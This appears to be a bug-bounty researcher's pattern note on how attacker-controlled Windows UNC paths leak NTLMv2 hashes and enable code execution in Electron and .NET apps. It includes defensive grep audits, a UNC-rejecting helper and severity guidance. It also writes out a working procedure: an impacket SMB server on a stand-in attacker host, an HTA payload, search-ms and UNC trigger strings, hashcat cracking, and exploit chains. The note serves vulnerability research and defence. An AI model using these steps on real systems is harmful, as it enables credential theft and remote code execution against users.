---
type: pattern
title: Pattern - Windows UNC Path Primitive (cross-pattern abstraction)
tags: [pattern, meta-pattern, cwe-918, cwe-922, cwe-200, ntlm, smb, windows, primitive, bb-pattern]
status: active
last_updated: 2026-04-27
severity: varies — P3 6.0 (file-read NTLM oracle) to P1 9.6 (shell-execute UNC RCE)
precedents: internal desktop-app cases (shell.openExternal UNC, JWT file-read UNC, will-download Variant C), CVE-2024-27288 (Discord), Slack 2020 (HackerOne #783877), search-ms+SMB test round
---

# Pattern — Windows UNC Path Primitive

> **Meta-pattern**: abstracts "on Windows, any sink that accepts an attacker-controlled path -> SMB connect -> NTLMv2 leak (plus RCE escalation depending on the sink)" out of [[Pattern - shell.openExternal UNC RCE]], [[Pattern - JWT File-based Validation UNC NTLM Oracle]], [[Pattern - Electron will-download Path Traversal]] Variant C, and several session lessons.

## TL;DR

On Windows, **any API that accepts an attacker-controlled path / URL** will, as soon as that path is passed to an OS-level filesystem / shell primitive in `\\server\share\...` form (or an equivalent scheme):

1. **Always trigger an SMB connect** → the NTLMv2 hash is captured by the attacker (this holds even if the subsequent read/exec fails)
2. **Escalate differently depending on the sink type**:
   - `fs.readFile`-style sinks → file-existence/timing oracle, content-read DoS
   - `shell.openExternal` / `ShellExecuteEx`-style sinks → 1-click PE execution (past the IAttachmentExecute dialog)
   - Explorer-spawning schemes (`search-ms:`) → 0-dialog NTLM theft

This primitive is **not Electron-specific**: any Node.js / .NET / native Windows app with a path-typed parameter that doesn't reject UNC is affected. Electron sees this pattern often because its IPC handlers / scheme dispatchers accept a large number of path parameters.

**Core observation**: developers typically block `../` (path traversal), absolute paths, or use a scheme allowlist — almost nobody blocks the `\\server\share\...` UNC form, because a `URL` parser treats `\\server\` as `file://server/` rather than traversal, allowlists only check the protocol scheme, and Path APIs treat it as a legitimate absolute path.

## Root-cause Shape

```
attacker-controlled path/URL
       │
       ▼
┌─────────────────────────────────────────┐
│  Sink category (maps to individual patterns) │
├─────────────────────────────────────────┤
│  fs.readFile / fs.access / fs.stat      │ → JWT UNC NTLM Oracle
│  fs.createWriteStream / writeFile       │ → will-download Variant C
│  shell.openExternal → ShellExecuteEx    │ → shell.openExternal UNC RCE
│  WinAPI ShellExecuteEx / CreateProcess  │ → same (parallel .NET/native case)
│  IAttachmentExecute on `.exe`/`.hta`    │ → same (1-click exec after dialog)
│  Explorer triggering `search-ms:`       │ → 0-dialog NTLM theft
└─────────────────────────────────────────┘
       │
       ▼
Windows kernel SMB redirector
  → NTLMv2 challenge/response fires automatically
  → whether the UNC payload is successfully retrieved + executed depends on Defender / SmartScreen / SAC
```

## Variants (forms of UNC projection on Windows)

| Variant | Form | Interactions | NTLM theft | Code exec | Patch status |
|---------|------|---------------|-----------|----------|---------|
| **A** UNC `.exe` / `.hta` / `.lnk` | `\\IP\share\poc.exe` | 2 (link click + Run dialog) | yes | yes | Confirmed live on fully-patched Windows 11 |
| **B** `search-ms:` + UNC location | `search-ms:query=X&crumb=location:\\IP\share` | 1 (link click only) | yes | no (Explorer only) | Confirmed live on fully-patched Windows 11 |
| **C** plain UNC for file-read | `\\IP\share\token.jwt` | 0 (API call alone triggers SMB) | yes | no (read, not exec) | Semantically not something the OS should patch |
| **D** `file:`-prefixed UNC | `file:\\\\IP\\share\\poc.exe` | same as A | yes | yes | Parser normalizes to same as A |
| **E** WebDAV + `http://` | `\\IP@SSL@443\share\poc.exe` | — | — | no | Fully blocked by Edge SmartScreen |
| **F** `ms-msdt:` (Follina) | `ms-msdt:/id PCWDiagnostic ...` | — | — | no | Patched by Microsoft (CVE-2022-30190) |
| **G** `ms-appinstaller:` | — | — | — | no | Disabled by default (2024) |

> **Variants A/B/C/D remained 100% viable on fully-patched Windows 11 as of the most recent live confirmation.** Variants E/F/G are historical reference values only — advisories should not claim them.

## Sink Classification (which APIs/handlers trigger this)

### Tier 1: Shell-execute sinks (→ RCE)
- `Electron shell.openExternal(url)` — Variants A/B/D all apply
- `WinAPI ShellExecuteEx` / `ShellExecute` (.NET `Process.Start`)
- IAttachmentExecute (any download flow that prompts to "open" a `.exe`/`.hta`)
- Clicking `<a href="\\IP\share\...">` — applies to all webview / Chromium-based UIs

### Tier 2: File-read sinks (→ NTLM oracle + content read)
- `fs.readFile` / `fs.readFileSync` / `fs.access` / `fs.stat` / `fs.exists`
- `fs.createReadStream`
- `.NET File.ReadAllBytes` / `File.OpenRead` / `File.Exists`
- Any chain that feeds a path string into `path.resolve` followed by IO

### Tier 3: File-write sinks (→ NTLM + attacker-controlled share content)
- `fs.createWriteStream` / `fs.writeFile`
- Electron `webContents.session.on('will-download', ...)` writing `setSavePath(attacker_path)` to a UNC path (→ [[Pattern - Electron will-download Path Traversal]] Variant C)

### Tier 4: Explorer/shell scheme sinks (→ 0-dialog NTLM)
- `shell.openExternal("search-ms:...")`
- Any chain that produces `start search-ms:` or `explorer.exe search-ms:`
- Clicking `<a href="search-ms:...">` in Edge/Chrome

## Detection Methodology

```bash
# 1. Find all candidate sinks
grep -rEn 'shell\.(openExternal|openPath|showItemInFolder)' src/
grep -rEn 'fs\.(readFile|writeFile|access|stat|exists|create(Read|Write)Stream)' src/
grep -rEn 'ipcMain\.(on|handle)' src/  # find which handlers accept path/url params

# 2. For each sink, trace the input source back
#    - From an ipcMain arg → renderer → is there sender-frame validation?
#    - From server JSON → is that server trusted? (HTTP MITM could inject it)
#    - From a protocol-handler eventData → is there an executeJavaScript injection chain?

# 3. Check path/URL filtering
#    - Is there a scheme allowlist? (`https:`/`mailto:` only)
#    - Is UNC rejected? (`startsWith('\\\\') || startsWith('//')`)
#    - Checked again after URL parsing? (URL("\\\\IP\\share") behaves differently across parsers)
#    - path.isAbsolute() after path.resolve is not enough — UNC is still absolute

# 4. Use one SMB server to validate multiple candidate sinks in one PoC
sudo impacket-smbserver SHARE share -smb2support -username test -password test123
# feed \\<KALI_IP>\SHARE\probe.txt (read sinks) or \\<KALI_IP>\SHARE\poc.exe (exec sinks) to each candidate sink
# watch the impacket terminal: [*] User WINDOWS\test authenticated successfully
# capturing an NTLMv2 hash confirms the sink is reachable
```

## Live Verification SOP (Windows 11 + Kali VM)

```bash
# Set up unified attacker SMB infrastructure
mkdir share
cp /usr/share/windows-resources/binaries/whoami.exe share/poc.exe
echo "<html><body><script>new ActiveXObject('WScript.Shell').Run('calc.exe')</script></body></html>" > share/pwn.hta
echo "ntlm-probe-content" > share/probe.txt
sudo impacket-smbserver SHARE share -smb2support -username test -password test123 2>&1 | tee smb.log

# Per-sink trigger (adjust to the target app's IPC channel)
# Tier 1 (RCE): trigger that reaches shell.openExternal(`\\\\KALI_IP\\SHARE\\poc.exe`)
# Tier 2 (read oracle): trigger fs.readFile(`\\\\KALI_IP\\SHARE\\probe.txt`)
# Tier 4 (0-dialog): trigger shell.openExternal(`search-ms:query=X&crumb=location:\\\\KALI_IP\\SHARE`)

# Expected output:
# [*] Incoming connection (10.x.x.x,49xxx)
# [*] User WINDOWS\<victim> authenticated successfully
# [*] :::<NTLMv2_HASH>:::
# [+] (Tier 1 only) Connecting Share(2:share)
# [+] (Tier 1 only) Found file POC.EXE
```

The NTLMv2 hash can then be offline-cracked (`hashcat -m 5600 hash.txt rockyou.txt`) or used for NTLM relay.

## Real-world Examples

| Vendor | Year | Variant | Sink Tier | Pattern |
|--------|------|---------|-----------|---------|
| **Electron IM app A** | 2026 | A | T1 (shell.openExternal) | [[Pattern - shell.openExternal UNC RCE]] |
| **Electron IM app A** | 2026 | A | T1 | Second independent sink, via a channel-type-injection path |
| **Electron IM app A** (search-ms test) | 2026 | B | T4 (search-ms) | [[Pattern - shell.openExternal UNC RCE]] §Variant B |
| **Electron IM app A** | 2026 | C | T2 (fs.readFile) | [[Pattern - JWT File-based Validation UNC NTLM Oracle]] |
| **Electron IM app A — partner build** | 2026 | C | T2 (.NET File API) | [[Pattern - JWT File-based Validation UNC NTLM Oracle]] §Variant 2 |
| **Electron IM app A** | 2026 | A | T3 (will-download UNC save path) | [[Pattern - Electron will-download Path Traversal]] Variant C |
| Discord (CVE-2024-27288) | 2024 | A | T1 | shell.openExternal validation bypass |
| Slack ($1750, HackerOne #783877) | 2020 | A | T1 | `<a href>` UNC click |
| Microsoft Outlook (CVE-2023-23397) | 2023 | C | T2 | Reminder sound `PidLidReminderFileParameter` UNC → NTLM |

## Defense (defense-in-depth)

```javascript
// Universal UNC reject helper
function rejectUNC(input) {
  if (typeof input !== 'string') return true;
  // 1. Direct UNC
  if (input.startsWith('\\\\') || input.startsWith('//')) return true;
  // 2. file: -wrapped UNC
  if (/^file:[\\/]{2,}/i.test(input)) {
    const stripped = input.replace(/^file:/i, '');
    if (stripped.startsWith('\\\\') || stripped.startsWith('//')) return true;
  }
  // 3. URL parser resolves to file: scheme with a host
  try {
    const u = new URL(input);
    if (u.protocol === 'file:' && u.host) return true;
    // 4. search-ms: + crumb containing a UNC
    if (u.protocol === 'search-ms:' && /location:[\\/]{2,}/i.test(u.search)) return true;
    // 5. reject all ms-* / search-ms shell schemes
    if (u.protocol.startsWith('ms-') || u.protocol === 'search-ms:') return true;
  } catch {}
  return false;
}

// Apply to every path/url IPC handler
ipcMain.handle('any:pathHandler', (e, { path }) => {
  if (rejectUNC(path)) throw new Error('UNC paths rejected');
  // add sender-frame validation
  if (!e.senderFrame.url.startsWith('https://my-app.com/')) throw new Error('untrusted sender');
  // ... do the work
});
```

**OS-level mitigations** (supplementary layers — don't rely on these alone):
- Group Policy: `Network access: Restrict clients allowed to make remote calls to SAM`
- Windows Firewall: block outbound `445/tcp` + `137-139/udp` to the internet
- Defender ASR rule: `Block credential stealing from the Windows local security authority subsystem (lsass.exe)`

## Filing & Severity Guidance

| Sink Tier | Typical CVSS | UI:R? | Must describe |
|-----------|----------|-------|--------|
| T1 (shell-execute) | 9.6 Critical (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`) | yes | NTLM theft + 1-click PE exec — two independent impacts |
| T2 (file-read) | 6.0 Medium (`AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N`) | yes (usually needs an IPC trigger) | NTLM theft only; do not write RCE |
| T3 (file-write) | 6.5-8.0 (depends on the chain) | yes | NTLM + attacker-controlled file content |
| T4 (search-ms 0-dialog) | 8.1 High (`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`) | yes (1 click only) | NTLM theft, framed as 0-dialog |

**General anti-overclaiming rules**:
- Do NOT write "0-click RCE" — nobody has demonstrated this on fully-patched Windows 11 (IAttachmentExecute cannot be avoided)
- DO write, for T1: "LIVE-VERIFIED attacker-controlled remote code execution via UNC path, requiring Windows security confirmation (UI:R)"
- DO write, for T2: "NTLMv2 hash exfiltration enabling Pass-the-Hash / NTLM relay attacks" — do not write RCE
- macOS / Linux: UNC does not trigger SMB → this primitive is **Windows-specific**; advisories must state this

## Chains

Combining different tiers:

- **Full 1-click takeover**: custom scheme handler injection ([[Pattern - Electron Custom Scheme Handler Injection]]) → preload exposure ([[Pattern - Electron Preload Injection Chain]]) → `navigateObj.openWindow(\\IP\share\poc.exe)` → T1 sink → ShellExecuteEx → SMB → PE exec
- **0-dialog NTLM theft**: any in-app XSS → `window.navigateObj.openWindow("search-ms:...")` → T4 sink → Explorer → SMB
- **Recon ladder**: T2 sink → directory-enumeration timing oracle → locate a config path → escalate to file-content disclosure
- **MITM-only chain** ([[Pattern - Electron Preload Origin-Agnostic Injection]]): HTTP server URL → MITM HTML → preload exposure → T1/T4 sink

## Why This Abstraction Matters

Historically these 4 tiers were audited as separate vuln classes, but **they share the same OS-level primitive** (the Windows kernel SMB redirector + automatic NTLMv2 auth). Abstracting the primitive into a single Pattern means:

- When auditing a new Electron / .NET app, you can grep the Sink Classification table's 4 tiers directly and find everything in one pass
- Advisory writing can cite a single unified explanation instead of re-deriving "why does UNC trigger SMB" every time
- Defense guidance can be written once (`rejectUNC` helper) and applied to every sink
- Filing severity won't confuse a T2 6.0 Medium with a T1 9.6 Critical

## Related

### Child Patterns (concrete sink cases)
- [[Pattern - shell.openExternal UNC RCE]] — T1 RCE
- [[Pattern - JWT File-based Validation UNC NTLM Oracle]] — T2 read oracle
- [[Pattern - Electron will-download Path Traversal]] — T3 write + path traversal Variant C
- [[Pattern - Electron Custom Scheme Handler Injection]] — common trigger entrypoint
- [[Pattern - Electron Preload Injection Chain]] — common trigger entrypoint
- [[Pattern - Electron Preload Origin-Agnostic Injection]] — 0-click MITM trigger entrypoint

### Lessons
- [[Lessons Learned]] — `shell.openExternal(UNC)` is a TRUE RCE primitive
- [[Lessons Learned]] — preload.js injection is not origin-scoped
- [[Lessons Learned]] — custom scheme handler `case` dispatch is a common injection-point collection

### CVEs
- CVE-2024-27288 (Discord shell.openExternal)
- CVE-2023-23397 (Outlook reminder UNC NTLM)
- CVE-2018-15685 (Electron downloadURL path traversal — T3 sibling)
